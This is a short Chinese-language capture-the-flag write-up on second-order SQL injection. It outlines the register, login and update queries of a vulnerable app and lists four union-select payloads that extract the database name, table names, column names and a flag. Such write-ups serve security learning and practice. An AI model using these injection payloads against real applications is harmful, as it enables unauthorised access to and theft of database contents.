---
Author: Coder-LYQ
Date: 2021-1-13
---

##  思路

1. 二次注入原理

   用户注册：

   `insert into 数据表(列名1,列名2) VALUES ('','')`

   `insert into users(username,password,info) values ('{$username}','{$password}',' ');`

   用户登录：

   `select * from 数据表 where username='' and password=''`

   `select * from users where username='{$username}' and password='{$password}';`

   修改内容：

   `update users set info='{$info}' where username='{$_SESSION['username']}';`

2. union select语句特殊用法

3. payload

   ```sql
   username =1' union select database() #
   
   username =1' union select group_concat(table_name) from information_schema.tables where table_schema='ctftraining' #
   
   username =1' union select group_concat(column_name) from information_schema.columns where table_name='flag'#
   
   username =1' union select flag from flag #
   ```

   

## 总结

- 本题是一道sql二次注入的题目，不算特别难